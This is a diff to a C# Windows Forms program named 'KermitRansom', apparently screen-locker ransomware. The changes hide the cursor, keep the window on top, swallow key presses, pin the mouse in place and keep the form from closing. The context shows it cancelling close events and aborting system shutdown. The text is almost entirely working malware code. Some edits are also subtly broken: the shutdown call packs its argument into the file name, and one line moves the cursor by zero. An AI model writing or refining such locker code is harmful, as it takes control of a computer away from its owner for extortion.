@@ -20,6 +20,8 @@ namespace KermitRansom
         public Form1()
         {
             InitializeComponent();
+            Cursor.Hide();
+            TopMost = true;
         }
 
         [DllImport("user32.dll")]
@@ -38,7 +40,7 @@ namespace KermitRansom
             e.Cancel = true;
             if(e.CloseReason == CloseReason.WindowsShutDown)
             {
-                Process.Start("shutdown", " -a");
+                Process.Start("shutdown -a");
             }
             else if(e.CloseReason == CloseReason.TaskManagerClosing)
             {
@@ -54,8 +56,9 @@ namespace KermitRansom
         private void KeyPressAction(object sender, KeyEventArgs e)
         {
             e.SuppressKeyPress = true;
-            Cursor.Position = new Point(1000, 0);
-            
+            System.Threading.Thread.Sleep(666);
+            Cursor.Position = new System.Drawing.Point(1000,0);
+            Cursor.Position = new Point(Cursor.Position.X -0, Cursor.Position.Y -0);
         }
     }
 }
